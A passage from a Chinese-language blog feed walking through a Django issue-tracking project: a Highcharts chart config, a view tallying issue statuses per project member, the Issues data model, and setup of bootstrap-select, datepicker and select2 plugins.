class="string">'葡萄'</span>, <span class="string">'香蕉'</span>]</span><br><span class="line">        &#125;,</span><br><span class="line">        yAxis: &#123;</span><br><span class="line">            min: <span class="number">0</span>,</span><br><span class="line">            title: &#123;</span><br><span class="line">                text: <span class="string">'问题数量'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            stackLabels: &#123;  <span class="comment">// 堆叠数据标签</span></span><br><span class="line">                enabled: <span class="literal">true</span>,</span><br><span class="line">                style: &#123;</span><br><span class="line">                    fontWeight: <span class="string">'bold'</span>,</span><br><span class="line">                    color: (Highcharts.theme &amp;&amp; Highcharts.theme.textColor) || <span class="string">'gray'</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        legend: &#123;</span><br><span class="line">            align: <span class="string">'center'</span>,</span><br><span class="line">            verticalAlign: <span class="string">'top'</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            formatter: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;b&gt;'</span> + <span class="keyword">this</span>.x + <span class="string">'&lt;/b&gt;&lt;br/&gt;'</span> +</span><br><span class="line">                    <span class="keyword">this</span>.series.name + <span class="string">': '</span> + <span class="keyword">this</span>.y + <span class="string">'&lt;br/&gt;'</span> +</span><br><span class="line">                    <span class="string">'总量: '</span> + <span class="keyword">this</span>.point.stackTotal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        plotOptions: &#123;</span><br><span class="line">            column: &#123;</span><br><span class="line">                stacking: <span class="string">'normal'</span>,</span><br><span class="line">                dataLabels: &#123;</span><br><span class="line">                    enabled: <span class="literal">false</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        series: [&#123;</span><br><span class="line">            name: <span class="string">'新建'</span>,</span><br><span class="line">            data: [<span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>]</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            name: <span class="string">'新'</span>,</span><br><span class="line">            data: [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            name: <span class="string">'小潘'</span>,</span><br><span class="line">            data: [<span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: PROJECT_USER_API,</span><br><span class="line">        type: <span class="string">"GET"</span>,</span><br><span class="line">        data: &#123;<span class="attr">start</span>: start, <span class="attr">end</span>: end&#125;,</span><br><span class="line">        dataType: <span class="string">"JSON"</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">            config.xAxis.categories = res.data.categories;</span><br><span class="line">            config.series = res.data.series;</span><br><span class="line">            <span class="keyword">var</span> chart = Highcharts.chart(<span class="string">'projectUser'</span>, config)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>后端处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">statistics_project_user</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 项目成员每个人人被分配的任务类型（问题类型的配比）"""</span></span><br><span class="line"></span><br><span class="line">    start = request.GET.get(<span class="string">'start'</span>)</span><br><span class="line">    end = request.GET.get(<span class="string">'end'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.找到所有问题并却需要根据指派的用户 &amp; 分组</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    info = &#123;</span></span><br><span class="line"><span class="string">        1:&#123;</span></span><br><span class="line"><span class="string">            name:"hp",</span></span><br><span class="line"><span class="string">            status:&#123;</span></span><br><span class="line"><span class="string">                1:0</span></span><br><span class="line"><span class="string">                2:0</span></span><br><span class="line"><span class="string">                3:0</span></span><br><span class="line"><span class="string">                4:0</span></span><br><span class="line"><span class="string">                5:0</span></span><br><span class="line"><span class="string">                6:0</span></span><br><span class="line"><span class="string">                7:0</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        2:&#123;</span></span><br><span class="line"><span class="string">            name:"sj",</span></span><br><span class="line"><span class="string">            status:&#123;</span></span><br><span class="line"><span class="string">                1:0</span></span><br><span class="line"><span class="string">                2:0</span></span><br><span class="line"><span class="string">                3:0</span></span><br><span class="line"><span class="string">                4:0</span></span><br><span class="line"><span class="string">                5:0</span></span><br><span class="line"><span class="string">                6:0</span></span><br><span class="line"><span class="string">                7:0</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    all_user_dict = collections.OrderedDict()</span><br><span class="line">    all_user_dict[request.tracer.project.creator.id] = &#123;</span><br><span class="line">        <span class="string">'name'</span>: request.tracer.project.creator.username,</span><br><span class="line">        <span class="string">'status'</span>: &#123;item[<span class="number">0</span>]: <span class="number">0</span> <span class="keyword">for</span> item <span class="keyword">in</span> models.Issues.status_choices&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    all_user_dict[<span class="literal">None</span>] = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'未指派'</span>,</span><br><span class="line">        <span class="string">'status'</span>: &#123;item[<span class="number">0</span>]: <span class="number">0</span> <span class="keyword">for</span> item <span class="keyword">in</span> models.Issues.status_choices&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    user_list = models.ProjectUser.objects.filter(project_id=project_id)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> user_list:</span><br><span class="line">        all_user_dict[item.user_id] = &#123;</span><br><span class="line">            <span class="string">'name'</span>: item.user.username,</span><br><span class="line">            <span class="string">'status'</span>: &#123;item[<span class="number">0</span>]: <span class="number">0</span> <span class="keyword">for</span> item <span class="keyword">in</span> models.Issues.status_choices&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 去数据库获取相关的所有问题</span></span><br><span class="line">    issues = models.Issues.objects.filter(project_id=project_id, create_datetime__gte=start, create_datetime__lt=end)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> issues:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> item.assign:</span><br><span class="line">            all_user_dict[<span class="literal">None</span>][<span class="string">'status'</span>][item.status] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            all_user_dict[item.assign_id][<span class="string">'status'</span>][item.status] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.获取所有的成员</span></span><br><span class="line">    categories = [data[<span class="string">'name'</span>] <span class="keyword">for</span> data <span class="keyword">in</span> all_user_dict.values()]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4.构造字典</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    info = &#123;</span></span><br><span class="line"><span class="string">        1:&#123;'name':'新建','data':[]&#125;</span></span><br><span class="line"><span class="string">        2:&#123;'name':'处理中','data':[]&#125;</span></span><br><span class="line"><span class="string">        3:&#123;'name':'已解决','data':[]&#125;</span></span><br><span class="line"><span class="string">        4:&#123;'name':'已忽略','data':[]&#125;</span></span><br><span class="line"><span class="string">        5:&#123;'name':'待反馈','data':[]&#125;</span></span><br><span class="line"><span class="string">        6:&#123;'name':'关闭','data':[]&#125;</span></span><br><span class="line"><span class="string">        7:&#123;'name':'重新打开','data':[]&#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    data_result_dict = collections.OrderedDict()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> models.Issues.status_choices:</span><br><span class="line">        data_result_dict[item[<span class="number">0</span>]] = &#123;<span class="string">'name'</span>:item[<span class="number">1</span>],<span class="string">"data"</span>:[]&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key,text <span class="keyword">in</span> models.Issues.status_choices:</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> all_user_dict.values():</span><br><span class="line">            count = row[<span class="string">'status'</span>][key]</span><br><span class="line">            data_result_dict[key][<span class="string">'data'</span>].append(count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'status'</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">'data'</span>: &#123;</span><br><span class="line">            <span class="string">'categories'</span>: categories,</span><br><span class="line">            <span class="string">'series'</span>: list(data_result_dict.values())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(context)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 概览 &amp; 统计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>问题管理</title>
      <link href="/2020/08/02/12%20%E9%97%AE%E9%A2%98%E7%AE%A1%E7%90%86/"/>
      <url>/2020/08/02/12%20%E9%97%AE%E9%A2%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="12-问题管理"><a href="#12-问题管理" class="headerlink" title="12 问题管理"></a>12 问题管理</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E9%97%AE%E9%A2%98%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2.jpg"  alt="问题管理页面"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%96%B0%E5%BB%BA%E9%97%AE%E9%A2%98.png"  alt="新建问题"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E9%82%80%E8%AF%B7%E6%88%90%E5%91%98.jpg"  alt="邀请成员"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E9%97%AE%E9%A2%98%E7%AE%A1%E7%90%86.jpg"  alt="问题管理"></p><h3 id="12-1问题管理的表结构设置"><a href="#12-1问题管理的表结构设置" class="headerlink" title="12.1问题管理的表结构设置"></a>12.1问题管理的表结构设置</h3><p><strong>问题</strong></p><table><thead><tr><th>ID</th><th>项目</th><th>问题类型</th><th>主题</th><th>模块</th><th>问题描述</th><th>状态</th><th>优先级</th><th>指派</th><th>关注者</th><th>开始时间</th><th>结束时间</th><th>模式</th><th>父问题</th><th>创建者</th><th>最后更新时间</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>模块</strong></p><table><thead><tr><th>ID</th><th>项目</th><th>模块</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>第一期网页的注册</td></tr><tr><td>2</td><td>1</td><td>第二期网页的登陆</td></tr></tbody></table><p><strong>问题类型</strong></p><table><thead><tr><th>ID</th><th>项目</th><th>问题类型</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>任务</td></tr><tr><td>2</td><td>1</td><td>功能</td></tr><tr><td>3</td><td>1</td><td>Bug</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Module</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">""" 模块(里程碑) """</span></span><br><span class="line">    project = models.ForeignKey(verbose_name=<span class="string">"项目"</span>, to=<span class="string">'Project'</span>)</span><br><span class="line">    title = models.CharField(verbose_name=<span class="string">"模块名称"</span>, max_length=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IssuesTyle</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">""" 问题类型 ：任务、功能、Bug"""</span></span><br><span class="line"></span><br><span class="line">    PROJECT_INIT_LIST = [<span class="string">"任务"</span>,<span class="string">"功能"</span>,<span class="string">"Bug"</span>]</span><br><span class="line"></span><br><span class="line">    title = models.CharField(verbose_name=<span class="string">"类型名称"</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    project = models.ForeignKey(verbose_name=<span class="string">"项目"</span>, to=<span class="string">'Project'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Issues</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="string">""" 问题 """</span></span><br><span class="line">    project = models.ForeignKey(verbose_name=<span class="string">"项目"</span>, to=<span class="string">'Project'</span>)</span><br><span class="line">    issues_type = models.ForeignKey(verbose_name=<span class="string">"问题类型"</span>, to=<span class="string">'IssuesTyle'</span>)</span><br><span class="line"></span><br><span class="line">    module = models.ForeignKey(verbose_name=<span class="string">"模块"</span>, to=<span class="string">'Module'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>)</span><br><span class="line">    subject = models.CharField(verbose_name=<span class="string">"主题"</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    desc = models.TextField(verbose_name=<span class="string">"问题描述"</span>)</span><br><span class="line">    priority_choices = (</span><br><span class="line">        (<span class="string">"danger"</span>, <span class="string">"高"</span>),</span><br><span class="line">        (<span class="string">"warning"</span>, <span class="string">"中"</span>),</span><br><span class="line">        (<span class="string">"success"</span>, <span class="string">"低"</span>),</span><br><span class="line">    )</span><br><span class="line">    priority = models.CharField(verbose_name=<span class="string">"优先级"</span>, max_length=<span class="number">12</span>, choices=priority_choices, default=<span class="string">'danger'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 新建、处理中、已解决、已忽略、待反馈、关闭、重新打开</span></span><br><span class="line">    status_choices = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">'新建'</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">'处理中'</span>),</span><br><span class="line">        (<span class="number">3</span>, <span class="string">'已解决'</span>),</span><br><span class="line">        (<span class="number">4</span>, <span class="string">'已忽略'</span>),</span><br><span class="line">        (<span class="number">5</span>, <span class="string">'待反馈'</span>),</span><br><span class="line">        (<span class="number">6</span>, <span class="string">'关闭'</span>),</span><br><span class="line">        (<span class="number">7</span>, <span class="string">'重新打开'</span>),</span><br><span class="line">    )</span><br><span class="line">    status = models.SmallIntegerField(verbose_name=<span class="string">'状态'</span>, choices=status_choices, default=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    assign = models.ForeignKey(verbose_name=<span class="string">'指派给'</span>, to=<span class="string">"UserInfo"</span>, related_name=<span class="string">'task'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>)</span><br><span class="line">    attention = models.ManyToManyField(verbose_name=<span class="string">'关注者'</span>, to=<span class="string">"UserInfo"</span>, related_name=<span class="string">'observer'</span>, blank=<span class="literal">True</span>)</span><br><span class="line">    start_date = models.DateField(verbose_name=<span class="string">'开始时间'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>)</span><br><span class="line">    end_date = models.DateField(verbose_name=<span class="string">'结束时间'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>)</span><br><span class="line">    mode_choices = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">'公开模式'</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">'隐私模式'</span>),</span><br><span class="line">    )</span><br><span class="line">    mode = models.SmallIntegerField(verbose_name=<span class="string">'模式'</span>, choices=mode_choices, default=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    parent = models.ForeignKey(verbose_name=<span class="string">'父问题'</span>, to=<span class="string">"self"</span>, related_name=<span class="string">'child'</span>, null=<span class="literal">True</span>, blank=<span class="literal">True</span>,</span><br><span class="line">                               on_delete=models.SET_NULL)</span><br><span class="line"></span><br><span class="line">    creator = models.ForeignKey(verbose_name=<span class="string">'创建者'</span>, to=<span class="string">"UserInfo"</span>, related_name=<span class="string">'create_problems'</span>)</span><br><span class="line"></span><br><span class="line">    create_datetime = models.DateTimeField(verbose_name=<span class="string">'创建时间'</span>, auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    latest_update_datetime = models.DateTimeField(verbose_name=<span class="string">'最后更新时间'</span>, auto_now=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.subject</span><br></pre></td></tr></table></figure><h3 id="12-2-知识点"><a href="#12-2-知识点" class="headerlink" title="12.2 知识点"></a>12.2 知识点</h3><h4 id="12-2-1-bootstrap-select选择框的使用"><a href="#12-2-1-bootstrap-select选择框的使用" class="headerlink" title="12.2.1 bootstrap-select选择框的使用"></a>12.2.1 bootstrap-select选择框的使用</h4><ul><li><p>下载bootstrap-select的css代码与js代码</p><p><a href="https://www.bootstrapselect.cn/" target="_blank" rel="noopener">https://www.bootstrapselect.cn/</a></p></li><li><p>导入css代码与js代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/css/bootstrap-select.min.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/js/bootstrap-select.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-select/js/i18n/defaults-zh_CN.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>用法：将<code>selectpicker</code>类添加到<code>select</code>元素以自动初始化<code>bootstrap-select</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"selectpicker"</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="12-2-2-Bootstrap-datepicker日期选择器"><a href="#12-2-2-Bootstrap-datepicker日期选择器" class="headerlink" title="12.2.2 Bootstrap-datepicker日期选择器"></a>12.2.2 Bootstrap-datepicker日期选择器</h4><p><a href="https://bootstrap-datepicker.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://bootstrap-datepicker.readthedocs.io/en/latest/</a></p><ul><li><p>下载Bootstrap-datepicker的css与js</p><p><a href="https://github.com/uxsolutions/bootstrap-datepicker/blob/master/docs/index.rst" target="_blank" rel="noopener">https://github.com/uxsolutions/bootstrap-datepicker/blob/master/docs/index.rst</a></p></li><li><p>导入css代码与js代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/css/bootstrap-datepicker.min.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/js/bootstrap-datepicker.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap-datepicker/locales/bootstrap-datepicker.zh-CN.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>用法：在日期选择器上调用<code>datepicker方法</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.datepicker'</span>).datepicker(<span class="string">'method'</span>, arg1, arg2);</span><br></pre></td></tr></table></figure></li></ul><h4 id="12-2-3-select2选择器"><a href="#12-2-3-select2选择器" class="headerlink" title="12.2.3 select2选择器"></a>12.2.3 select2选择器</h4><p>select2与bootstrap-select都为下拉框选择器，不过select2更加强大。</p><p><a href="https://select2.org/" target="_blank" rel="noopener">https://select2.org/</a></p><ul><li><p>下载select2的js与css代码</p><p><a href="https://github.com/select2/select2" target="_blank" rel="noopener">https://github.com/select2/select2</a></p></li><li><p>导入js与css</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'plugin/select2/css/select2.min.css' %&#125;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/select2/js/select2.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/select2/js/i18n/zh-CN.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>用法：调用 <code>.select2()</code> 在要初始化Select2的任何jQuery选择器上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.js-example-basic-single'</span>).select2();</span><br></pre></td></tr></table></figure></li></ul><h3 id="12-3-问题管理页面"><a href="#12-3-问题管理页面" class="headerlink" title="12.3 问题管理页面"></a>12.3 问题管理页面</h3><ul><li><p><strong>构造url代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    <span class="comment"># 问题管理</span></span><br><span class="line">url(<span class="string">r'^issues/$'</span>, issues.issues, name=<span class="string">'issues'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure></li><li><p><strong>构造form表单</strong></p><p>在forms文件夹下新建issues.py文件存放问题管理的相关的form表单的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> forms</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> web <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> web.forms.bootstrap <span class="keyword">import</span> BootSrtapForm</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IssuesModelForm</span><span class="params">(BootSrtapForm,forms.ModelForm)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Issues</span><br><span class="line">        exclude = [<span class="string">'project'</span>,<span class="string">'creator'</span>,<span class="string">'create_datetime'</span>,<span class="string">'latest_update_datetime'</span>]</span><br><span class="line"></span><br><span class="line">        widgets = &#123;</span><br><span class="line">            <span class="comment"># 为select框加上class属性，值为selectpicker。</span></span><br><span class="line">            